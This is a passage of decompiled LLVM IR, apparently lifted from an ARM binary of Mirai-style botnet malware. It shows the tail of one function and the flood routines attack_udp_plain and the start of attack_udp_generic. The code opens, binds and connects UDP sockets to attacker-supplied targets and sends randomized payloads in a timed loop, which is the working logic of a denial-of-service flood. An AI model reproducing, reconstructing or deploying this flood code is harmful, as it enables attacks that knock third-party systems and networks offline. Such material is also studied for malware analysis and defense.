  store i1 %v9_ab70, i1* %cpsr_z.global-to-local, align 1
  %v3_ab74 = load i32, i32* @r6, align 4
  %v4_ab74 = add i32 %v3_ab74, 2
  %v5_ab74 = inttoptr i32 %v4_ab74 to i16*
  store i16 %v1_ab68, i16* %v5_ab74, align 2
  br i1 %v9_ab70, label %dec_label_pc_ab7c, label %dec_label_pc_ab68.dec_label_pc_aa0c_crit_edge

dec_label_pc_ab68.dec_label_pc_aa0c_crit_edge:    ; preds = %dec_label_pc_ab68
  %v1_aa10.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_aa0c

dec_label_pc_ab7c:                                ; preds = %dec_label_pc_ab68, %dec_label_pc_aa00
  %v0_ab7c = call i32 @rand_next()
  %v1_ab80 = load i32, i32* @r6, align 4
  %v2_ab80 = add i32 %v1_ab80, 4
  %v3_ab80 = inttoptr i32 %v2_ab80 to i32*
  store i32 %v0_ab7c, i32* %v3_ab80, align 4
  store i32 %v6_a618, i32* %r0.global-to-local, align 4
  %v1_ab88 = load i32, i32* @r4, align 4
  %v9_ab88 = icmp eq i32 %v6_a618, %v1_ab88
  store i1 %v9_ab88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ab88, label %dec_label_pc_ab90, label %dec_label_pc_aa18

dec_label_pc_ab90:                                ; preds = %dec_label_pc_ab7c, %dec_label_pc_aa0c
  %v0_ab90 = call i32 @rand_next()
  store i32 %v0_ab90, i32* %r0.global-to-local, align 4
  %v0_ab94 = load i32, i32* @fp, align 4
  %v2_ab94 = icmp eq i32 %v0_ab94, 0
  store i1 %v2_ab94, i1* %cpsr_z.global-to-local, align 1
  %v1_ab98 = load i32, i32* @r6, align 4
  %v2_ab98 = add i32 %v1_ab98, 8
  %v3_ab98 = inttoptr i32 %v2_ab98 to i32*
  store i32 %v0_ab90, i32* %v3_ab98, align 4
  br i1 %v2_ab94, label %dec_label_pc_aa20, label %dec_label_pc_aba0

dec_label_pc_aba0:                                ; preds = %dec_label_pc_aa18, %dec_label_pc_ab90
  %v0_aba0 = call i32 @rand_next()
  %v1_aba0 = trunc i32 %v0_aba0 to i16
  store i32 %v0_aba0, i32* %r0.global-to-local, align 4
  %v3_aba4 = load i32, i32* @r6, align 4
  %v4_aba4 = add i32 %v3_aba4, 18
  %v5_aba4 = inttoptr i32 %v4_aba4 to i16*
  store i16 %v1_aba0, i16* %v5_aba4, align 2
  br label %dec_label_pc_aa20

dec_label_pc_abac:                                ; preds = %dec_label_pc_aa20, %dec_label_pc_a9b0
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_abb0 = call i32 @__GI_time(i32* null)
  store i32 %v2_abb0, i32* %r0.global-to-local, align 4
  store i32 %v2_a6d4, i32* %r3.global-to-local, align 4
  %v9_abb8 = icmp eq i32 %v2_a6d4, %v2_abb0
  store i1 %v9_abb8, i1* %cpsr_z.global-to-local, align 1
  %v6_abbc = icmp slt i32 %v2_a6d4, %v2_abb0
  br i1 %v6_abbc, label %dec_label_pc_abc0, label %dec_label_pc_abac.dec_label_pc_a9b0_crit_edge

dec_label_pc_abac.dec_label_pc_a9b0_crit_edge:    ; preds = %dec_label_pc_abac
  %v0_a9b4.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_a9b0

dec_label_pc_abc0:                                ; preds = %dec_label_pc_abac, %entry, %dec_label_pc_abcc
  %v1_abc8 = phi i32 [ %v3_a6e8, %entry ], [ %v1_abd0, %dec_label_pc_abcc ], [ %v2_abb0, %dec_label_pc_abac ]
  store i32 %v3_a504, i32* %r4.global-to-local, align 4
  store i32 %v24_a504, i32* %fp.global-to-local, align 4
  store i32 %v27_a504, i32* %lr.global-to-local, align 4
  ret i32 %v1_abc8

dec_label_pc_abcc:                                ; preds = %dec_label_pc_a6f8
  %v0_abcc = load i32, i32* @r8, align 4
  store i32 %v0_abcc, i32* %r0.global-to-local, align 4
  %v1_abd0 = call i32 @__GI___libc_close(i32 %v0_abcc)
  store i32 %v1_abd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_abc0

; uselistorder directives
  uselistorder i32 %v1_abd0, { 1, 0 }
  uselistorder i32 %v0_aba0, { 1, 0 }
  uselistorder i32 %v0_ab68, { 1, 0 }
  uselistorder i32 %v0_ab54, { 1, 0 }
  uselistorder i32 %v0_ab40, { 1, 0 }
  uselistorder i32 %v1_ab34, { 1, 2, 0 }
  uselistorder i32 %v0_aad8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_aa94, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_aa60, { 1, 0 }
  uselistorder i32 %v4_aa50, { 1, 0 }
  uselistorder i1 %v3_a9e0, { 1, 0 }
  uselistorder i1 %v7_a9cc, { 2, 1, 0 }
  uselistorder i32 %v2_a9a0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_a808, { 1, 2, 0 }
  uselistorder i32 %v1_a7cc, { 2, 1, 0 }
  uselistorder i32 %v1_a7c8, { 2, 0, 1 }
  uselistorder i32 %v1_a7c4, { 2, 0, 1 }
  uselistorder i32 %v1_a7c0, { 2, 0, 1 }
  uselistorder i32 %v1_a7bc, { 2, 0, 1 }
  uselistorder i32 %v3_a744, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_a740, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_a734, { 1, 0, 2 }
  uselistorder i1 %v7_a718, { 1, 0 }
  uselistorder i1 %v7_a6ec, { 1, 0 }
  uselistorder i32 %v3_a6e8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_a6d4, { 2, 1, 0 }
  uselistorder i32 %v6_a6c4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v6_a618, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_a600, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_a58c, { 1, 0 }
  uselistorder i32 %v6_a584, { 1, 0 }
  uselistorder i32 %v7_a56c, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 25, 26, 27, 28, 29, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r3.global-to-local, { 41, 42, 43, 44, 52, 45, 46, 47, 48, 49, 50, 51, 4, 1, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r2.global-to-local, { 35, 36, 37, 43, 38, 39, 40, 41, 42, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0 }
  uselistorder i32* %r1.global-to-local, { 35, 36, 37, 38, 39, 40, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 32, 31, 34, 33, 0 }
  uselistorder i32* %r0.global-to-local, { 38, 37, 40, 39, 42, 43, 41, 44, 46, 47, 45, 48, 50, 49, 51, 53, 52, 54, 55, 56, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %fp.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 5, 6, 7, 8, 9, 10, 11, 12, 21, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 0, 1, 2, 3, 4 }
  uselistorder i32 247, { 1, 2, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_abc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aba0, { 1, 0 }
  uselistorder label %dec_label_pc_aa20, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_plain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  store i32 %arg2, i32* @fp, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 %arg3, i32* %stack_var_-80, align 4
  %v2_ac00 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_ac0c = load i32, i32* @fp, align 4
  store i32 %v0_ac0c, i32* %r0.global-to-local, align 4
  %v2_ac10 = call i32 @calloc(i32 %v0_ac0c, i32 4)
  store i32 65535, i32* @r6, align 4
  %v0_ac1c = load i32, i32* @r5, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_ac10, i32* @sb, align 4
  %v0_ac2c = load i32, i32* @r4, align 4
  store i32 %v0_ac2c, i32* %r0.global-to-local, align 4
  %v5_ac30 = inttoptr i32 %v0_ac1c to i32*
  %v6_ac30 = call i32 @attack_get_opt_int(i32 %v0_ac2c, i32* %v5_ac30, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_ac34 = load i32, i32* @r5, align 4
  %v0_ac40 = load i32, i32* @r6, align 4
  store i32 %v0_ac40, i32* %r3.global-to-local, align 4
  %v0_ac44 = load i32, i32* @r4, align 4
  store i32 %v0_ac44, i32* %r0.global-to-local, align 4
  %v3_ac48 = urem i32 %v6_ac30, 65536
  store i32 %v3_ac48, i32* @r8, align 4
  %v5_ac4c = inttoptr i32 %v0_ac34 to i32*
  %v6_ac4c = call i32 @attack_get_opt_int(i32 %v0_ac44, i32* %v5_ac4c, i32 6, i32 %v0_ac40, i32 ptrtoint (i32* @0 to i32))
  %v0_ac50 = load i32, i32* @r5, align 4
  %v3_ac54 = mul i32 %v6_ac4c, 65536
  store i32 %v3_ac54, i32* @sl, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_ac60 = load i32, i32* @r4, align 4
  store i32 %v0_ac60, i32* %r0.global-to-local, align 4
  %v5_ac64 = inttoptr i32 %v0_ac50 to i32*
  %v6_ac64 = call i32 @attack_get_opt_int(i32 %v0_ac60, i32* %v5_ac64, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ac74 = urem i32 %v6_ac64, 65536
  %v0_ac78 = load i32, i32* @r5, align 4
  %v0_ac7c = load i32, i32* @r4, align 4
  store i32 %v0_ac7c, i32* %r0.global-to-local, align 4
  %v5_ac84 = inttoptr i32 %v0_ac78 to i32*
  %v6_ac84 = call i32 @attack_get_opt_int(i32 %v0_ac7c, i32* %v5_ac84, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ac90 = urem i32 %v6_ac84, 256
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v2_acac = call i32 @__GI_time(i32* null)
  store i32 %v2_acac, i32* %r0.global-to-local, align 4
  %v0_acb0 = load i32, i32* @sl, align 4
  %v3_acb0 = udiv i32 %v0_acb0, 65536
  %v1_acb4 = load i32, i32* @r6, align 4
  %v9_acb4 = icmp eq i32 %v3_acb0, %v1_acb4
  br i1 %v9_acb4, label %dec_label_pc_ae88, label %bb

bb:                                               ; preds = %entry
  %v4_acbc = udiv i32 %v0_acb0, 16777216
  store i32 %v4_acbc, i32* %r3.global-to-local, align 4
  %v1_acc0 = load i32, i32* @r7, align 4
  %v2_acc0 = add i32 %v1_acc0, %v2_acac
  store i32 %v2_acc0, i32* %r0.global-to-local, align 4
  %v2_acb8 = mul nuw nsw i32 %v3_acb0, 256
  %v5_acc4 = and i32 %v2_acb8, 65280
  %v6_acc4 = or i32 %v5_acc4, %v4_acbc
  br label %dec_label_pc_acd4

dec_label_pc_acd4:                                ; preds = %bb, %dec_label_pc_ae88
  %v0_acc88 = phi i32 [ %v2_acc011, %dec_label_pc_ae88 ], [ %v2_acc0, %bb ]
  %stack_var_-72.1 = phi i32 [ %v3_ae90, %dec_label_pc_ae88 ], [ %v6_acc4, %bb ]
  %v0_acd4 = load i32, i32* @fp, align 4
  %v2_acd4 = icmp eq i32 %v0_acd4, 0
  br i1 %v2_acd4, label %dec_label_pc_ae0c, label %dec_label_pc_acdc

dec_label_pc_acdc:                                ; preds = %dec_label_pc_acd4
  store i32 0, i32* @sl, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v2_ad08 = ptrtoint i32* %stack_var_-56 to i32
  %sext = mul i32 %stack_var_-72.1, 65536
  %v4_ad30 = sdiv i32 %sext, 65536
  br label %dec_label_pc_ad5c

dec_label_pc_acec:                                ; preds = %.thread24, %dec_label_pc_ad98
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_acf8 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_acf8, i32* %r0.global-to-local, align 4
  %v7_acfc = icmp eq i32 %v3_acf8, -1
  %v0_ad00 = load i32, i32* @sl, align 4
  %v1_ad00 = add i32 %v0_ad00, 1
  store i32 %v1_ad00, i32* @sl, align 4
  %v0_ad04 = load i32, i32* @r7, align 4
  %v1_ad04 = add i32 %v0_ad04, 24
  store i32 %v1_ad04, i32* @r7, align 4
  %v1_ad10 = load i32, i32* @r6, align 4
  %v2_ad10 = load i32, i32* @sb, align 4
  %v3_ad10 = add i32 %v2_ad10, %v1_ad10
  %v4_ad10 = inttoptr i32 %v3_ad10 to i32*
  store i32 %v3_acf8, i32* %v4_ad10, align 4
  br i1 %v7_acfc, label %dec_label_pc_ae30.loopexit12, label %dec_label_pc_ad18

dec_label_pc_ad18:                                ; preds = %dec_label_pc_acec
  store i32 2, i32* %stack_var_-56, align 4
  store i32 %stack_var_-72.1, i32* %r3.global-to-local, align 4
  %v0_ad30 = load i32, i32* %r0.global-to-local, align 4
  %v6_ad30 = call i32 @bind(i32 %v0_ad30, i32 %v2_ad08, i32 16, i32 %v4_ad30, i32 2)
  store i32 %v6_ad30, i32* %r0.global-to-local, align 4
  %v0_ad34 = load i32, i32* @r5, align 4
  %v1_ad34 = add i32 %v0_ad34, 20
  %v2_ad34 = inttoptr i32 %v1_ad34 to i8*
  %v3_ad34 = load i8, i8* %v2_ad34, align 1
  %v4_ad34 = zext i8 %v3_ad34 to i32
  store i32 %v4_ad34, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_ad34, 32
  br i1 %tmp, label %dec_label_pc_adac, label %dec_label_pc_ad40

dec_label_pc_ad40:                                ; preds = %dec_label_pc_ad18
  %v0_ad40 = load i32, i32* @r6, align 4
  %v1_ad40 = load i32, i32* @sb, align 4
  %v2_ad40 = add i32 %v1_ad40, %v0_ad40
  %v3_ad40 = inttoptr i32 %v2_ad40 to i32*
  %v4_ad40 = load i32, i32* %v3_ad40, align 4
  store i32 %v4_ad40, i32* %r0.global-to-local, align 4
  %v3_ad4c = call i32 @__libc_connect(i32 %v4_ad40, i32 %v0_ad34, i32 16)
  store i32 %v3_ad4c, i32* %r0.global-to-local, align 4
  %v0_ad50 = load i32, i32* @sl, align 4
  %v1_ad50 = load i32, i32* @fp, align 4
  %v9_ad50 = icmp eq i32 %v0_ad50, %v1_ad50
  %v0_ad54 = load i32, i32* @r6, align 4
  %v1_ad54 = add i32 %v0_ad54, 4
  store i32 %v1_ad54, i32* @r6, align 4
  br i1 %v9_ad50, label %dec_label_pc_ae0c, label %dec_label_pc_ad5c

dec_label_pc_ad5c:                                ; preds = %dec_label_pc_adac, %dec_label_pc_ad40, %dec_label_pc_acdc
  store i32 65535, i32* @r4, align 4
  store i32 65535, i32* %r0.global-to-local, align 4
  %v2_ad6c = call i32 @calloc(i32 65535, i32 1)
  store i32 %v2_ad6c, i32* %r0.global-to-local, align 4
  %v0_ad70 = load i32, i32* @r8, align 4
  %v3_ad74 = udiv i32 %v0_ad70, 256
  %v1_ad70 = mul i32 %v0_ad70, 256
  %v4_ad78 = and i32 %v1_ad70, 65280
  %v5_ad78 = or i32 %v4_ad78, %v3_ad74
  store i32 %v5_ad78, i32* %r3.global-to-local, align 4
  %v2_ad7c = load i32, i32* %stack_var_-80, align 4
  %v1_ad80 = load i32, i32* @r7, align 4
  %v2_ad80 = add i32 %v1_ad80, %v2_ad7c
  store i32 %v2_ad80, i32* @r5, align 4
  %v1_ad88 = load i32, i32* @r4, align 4
  %v9_ad88 = icmp eq i32 %v0_ad70, %v1_ad88
  %v1_ad8c = load i32, i32* @r6, align 4
  %v3_ad8c = add i32 %v1_ad8c, %v2_ac00
  %v4_ad8c = inttoptr i32 %v3_ad8c to i32*
  store i32 %v2_ad6c, i32* %v4_ad8c, align 4
  br i1 %v9_ad88, label %dec_label_pc_ad98, label %.thread24

.thread24:                                        ; preds = %dec_label_pc_ad5c
  %v1_ad9025 = load i32, i32* %r3.global-to-local, align 4
  %v2_ad9026 = trunc i32 %v1_ad9025 to i16
  %v3_ad9027 = load i32, i32* @r5, align 4
  %v4_ad9028 = add i32 %v3_ad9027, 2
  %v5_ad9029 = inttoptr i32 %v4_ad9028 to i16*
  store i16 %v2_ad9026, i16* %v5_ad9029, align 2
  br label %dec_label_pc_acec

dec_label_pc_ad98:                                ; preds = %dec_label_pc_ad5c
  %v0_ad98 = call i32 @rand_next()
  %v1_ad98 = trunc i32 %v0_ad98 to i16
  store i32 %v0_ad98, i32* %r0.global-to-local, align 4
  %v2_ad9c = load i32, i32* %stack_var_-80, align 4
  store i32 %v2_ad9c, i32* %r3.global-to-local, align 4
  %v1_ada0 = load i32, i32* @r7, align 4
  %v2_ada0 = add i32 %v1_ada0, %v2_ad9c
  store i32 %v2_ada0, i32* @r5, align 4
  %v4_ada4 = add i32 %v2_ada0, 2
  %v5_ada4 = inttoptr i32 %v4_ada4 to i16*
  store i16 %v1_ad98, i16* %v5_ada4, align 2
  br label %dec_label_pc_acec

dec_label_pc_adac:                                ; preds = %dec_label_pc_ad18
  %v1_adac = add i32 %v0_ad34, 16
  %v2_adac = inttoptr i32 %v1_adac to i32*
  %v3_adac = load i32, i32* %v2_adac, align 4
  store i32 %v3_adac, i32* @r4, align 4
  %v0_adb0 = call i32 @rand_next()
  store i32 %v0_adb0, i32* %r0.global-to-local, align 4
  %v0_adb4 = load i32, i32* @r4, align 4
  %v1_adb4 = and i32 %v0_adb4, 16711680
  %v3_adb8 = udiv i32 %v0_adb4, 16777216
  %v4_adbc = udiv i32 %v1_adb4, 256
  %v5_adbc = or i32 %v4_adbc, %v3_adb8
  %v1_adc0 = and i32 %v0_adb4, ptrtoint (i32* @global_var_ff00.28 to i32)
  store i32 %v1_adc0, i32* %r3.global-to-local, align 4
  %v0_adc4 = load i32, i32* @r5, align 4
  %v1_adc4 = add i32 %v0_adc4, 20
  %v2_adc4 = inttoptr i32 %v1_adc4 to i8*
  %v3_adc4 = load i8, i8* %v2_adc4, align 1
  %v4_adc4 = zext i8 %v3_adc4 to i32
  %v4_adc8 = mul i32 %v1_adc0, 256
  %v4_adcc = mul i32 %v0_adb4, 16777216
  %v5_adc8 = or i32 %v4_adc8, %v4_adcc
  %v5_adcc = or i32 %v5_adc8, %v5_adbc
  %v7_add0 = lshr i32 %v0_adb0, %v4_adc4
  %v8_add0 = add i32 %v7_add0, %v5_adcc
  %v1_add4 = and i32 %v8_add0, 16711680
  store i32 %v1_add4, i32* %r0.global-to-local, align 4
  %v5_ade8 = call i32 @llvm.bswap.i32(i32 %v8_add0)
  store i32 %v5_ade8, i32* %r3.global-to-local, align 4
  %v2_adec = add i32 %v0_adc4, 4
  %v3_adec = inttoptr i32 %v2_adec to i32*
  store i32 %v5_ade8, i32* %v3_adec, align 4
  %v0_adf0 = load i32, i32* @r5, align 4
  %v0_adf4 = load i32, i32* @r6, align 4
  %v1_adf4 = load i32, i32* @sb, align 4
  %v2_adf4 = add i32 %v1_adf4, %v0_adf4
  %v3_adf4 = inttoptr i32 %v2_adf4 to i32*
  %v4_adf4 = load i32, i32* %v3_adf4, align 4
  store i32 %v4_adf4, i32* %r0.global-to-local, align 4
  %v3_adfc = call i32 @__libc_connect(i32 %v4_adf4, i32 %v0_adf0, i32 16)
  store i32 %v3_adfc, i32* %r0.global-to-local, align 4
  %v0_ae00 = load i32, i32* @sl, align 4
  %v1_ae00 = load i32, i32* @fp, align 4
  %v9_ae00 = icmp eq i32 %v0_ae00, %v1_ae00
  %v0_ae04 = load i32, i32* @r6, align 4
  %v1_ae04 = add i32 %v0_ae04, 4
  store i32 %v1_ae04, i32* @r6, align 4
  br i1 %v9_ae00, label %dec_label_pc_ae0c, label %dec_label_pc_ad5c

dec_label_pc_ae0c:                                ; preds = %dec_label_pc_adac, %dec_label_pc_ad40, %dec_label_pc_acd4
  %v1_ae1019 = phi i32 [ 0, %dec_label_pc_acd4 ], [ %v0_ae00, %dec_label_pc_adac ], [ %v0_ad50, %dec_label_pc_ad40 ]
  store i32 0, i32* @r5, align 4
  %v2_ae44 = icmp eq i32 %v1_ac90, 0
  br label %dec_label_pc_ae10

dec_label_pc_ae10:                                ; preds = %dec_label_pc_ae10.backedge, %dec_label_pc_ae0c
  %v1_ae10 = phi i32 [ %v1_ae10.pre, %dec_label_pc_ae10.backedge ], [ %v1_ae1019, %dec_label_pc_ae0c ]
  %v1_ae48 = phi i32 [ %v0_ae1017, %dec_label_pc_ae10.backedge ], [ 0, %dec_label_pc_ae0c ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v5_ae18 = icmp slt i32 %v1_ae48, %v1_ae10
  br i1 %v5_ae18, label %dec_label_pc_ae3c, label %dec_label_pc_ae1c

dec_label_pc_ae1c:                                ; preds = %dec_label_pc_ae10
  %v2_ae1c = call i32 @__GI_time(i32* null)
  store i32 %v2_ae1c, i32* %r0.global-to-local, align 4
  store i32 %v0_acc88, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v6_ae2c = icmp slt i32 %v0_acc88, %v2_ae1c
  br i1 %v6_ae2c, label %dec_label_pc_ae30, label %dec_label_pc_ae10.backedge

dec_label_pc_ae30.loopexit12:                     ; preds = %dec_label_pc_acec
  %v1_ae38.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ae30

dec_label_pc_ae30:                                ; preds = %dec_label_pc_ae1c, %dec_label_pc_ae30.loopexit12
  %v1_ae38 = phi i32 [ %v1_ae38.pre, %dec_label_pc_ae30.loopexit12 ], [ %v2_ae1c, %dec_label_pc_ae1c ]
  ret i32 %v1_ae38

dec_label_pc_ae3c:                                ; preds = %dec_label_pc_ae10
  store i32 %v2_ac00, i32* %r3.global-to-local, align 4
  %v4_ae48 = mul i32 %v1_ae48, 4
  %v5_ae48 = add i32 %v4_ae48, %v2_ac00
  %v6_ae48 = inttoptr i32 %v5_ae48 to i32*
  %v7_ae48 = load i32, i32* %v6_ae48, align 4
  store i32 %v7_ae48, i32* @r4, align 4
  br i1 %v2_ae44, label %dec_label_pc_ae50, label %dec_label_pc_ae6c

dec_label_pc_ae50:                                ; preds = %dec_label_pc_ae3c, %dec_label_pc_ae6c
  %v0_ae54 = phi i32 [ %v7_ae48, %dec_label_pc_ae3c ], [ %v0_ae54.pre, %dec_label_pc_ae6c ]
  %v1_ae50 = phi i32 [ %v1_ae48, %dec_label_pc_ae3c ], [ %v1_ae50.pre, %dec_label_pc_ae6c ]
  %v0_ae50 = load i32, i32* @sb, align 4
  %v4_ae50 = mul i32 %v1_ae50, 4
  %v5_ae50 = add i32 %v4_ae50, %v0_ae50
  %v6_ae50 = inttoptr i32 %v5_ae50 to i32*
  %v7_ae50 = load i32, i32* %v6_ae50, align 4
  store i32 %v7_ae50, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ae60 = call i32 @__libc_send(i32 %v7_ae50, i32 %v0_ae54, i32 %v3_ac74, i32 16384)
  store i32 %v4_ae60, i32* %r0.global-to-local, align 4
  %v0_ae64 = load i32, i32* @r5, align 4
  %v1_ae64 = add i32 %v0_ae64, 1
  store i32 %v1_ae64, i32* @r5, align 4
  br label %dec_label_pc_ae10.backedge

dec_label_pc_ae10.backedge:                       ; preds = %dec_label_pc_ae50, %dec_label_pc_ae1c
  %v0_ae1017 = phi i32 [ %v1_ae64, %dec_label_pc_ae50 ], [ 0, %dec_label_pc_ae1c ]
  %v1_ae10.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_ae10

dec_label_pc_ae6c:                                ; preds = %dec_label_pc_ae3c
  store i32 %v7_ae48, i32* %r0.global-to-local, align 4
  %v2_ae74 = call i32 @rand_alphastr(i32 %v7_ae48, i32 %v3_ac74)
  store i32 %v2_ae74, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ae80 = load i32, i32* @r4, align 4
  %v4_ae80 = add i32 %v3_ae80, %v3_ac74
  %v5_ae80 = inttoptr i32 %v4_ae80 to i8*
  store i8 0, i8* %v5_ae80, align 1
  %v1_ae50.pre = load i32, i32* @r5, align 4
  %v0_ae54.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ae50

dec_label_pc_ae88:                                ; preds = %entry
  %v1_acc010 = load i32, i32* @r7, align 4
  %v2_acc011 = add i32 %v1_acc010, %v2_acac
  store i32 %v2_acc011, i32* %r0.global-to-local, align 4
  %v0_ae88 = call i32 @rand_next()
  %v3_ae90 = urem i32 %v0_ae88, 65536
  store i32 %v3_ae90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_acd4

; uselistorder directives
  uselistorder i32 %v2_acc011, { 1, 0 }
  uselistorder i32 %v7_ae48, { 2, 1, 0, 3 }
  uselistorder i32 %v5_ade8, { 1, 0 }
  uselistorder i32 %v0_adb4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_ad98, { 1, 0 }
  uselistorder i32 %v0_ad70, { 2, 0, 1 }
  uselistorder i32 %v3_acf8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-72.1, { 1, 0 }
  uselistorder i32 %v0_acc88, { 1, 0 }
  uselistorder i32 %v4_acbc, { 1, 0 }
  uselistorder i32 %v3_ac74, { 2, 1, 0 }
  uselistorder i32 %v2_ac00, { 0, 2, 1 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 10, 11, 8, 9, 12, 14, 13, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 15, 3, 2, 5, 4, 19, 7, 6, 10, 8, 9, 11, 12, 23, 21, 14, 13, 16, 18, 20, 17, 22, 25, 24, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ae50, { 1, 0 }
  uselistorder label %dec_label_pc_ae30, { 1, 0 }
  uselistorder label %dec_label_pc_acec, { 1, 0 }
  uselistorder label %dec_label_pc_acd4, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_ae9c = load i32, i32* @lr, align 4
  store i32 0, i32* @r8, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_aec8 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_aecc = load i32, i32* @r4, align 4
  store i32 %v0_aecc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_aed8 = load i32, i32* @r8, align 4
  store i32 %v0_aed8, i32* %r3.global-to-local, align 4
  %v0_aedc = load i32, i32* @r5, align 4
  store i32 %v0_aedc, i32* %r0.global-to-local, align 4
  %v5_aee0 = inttoptr i32 %v0_aecc to i32*
  %v6_aee0 = call i32 @attack_get_opt_int(i32 %v0_aedc, i32* %v5_aee0, i32 2, i32 %v0_aed8, i32 %v2_aec8)
  %v1_aeec = urem i32 %v6_aee0, 256
  store i32 %v1_aeec, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_aef8 = load i32, i32* @r4, align 4
  store i32 %v0_aef8, i32* %r1.global-to-local, align 4
  %v0_aefc = load i32, i32* @r5, align 4
  store i32 %v0_aefc, i32* %r0.global-to-local, align 4
  %v5_af00 = trunc i32 %v6_aee0 to i8
  %v6_af04 = inttoptr i32 %v0_aef8 to i32*
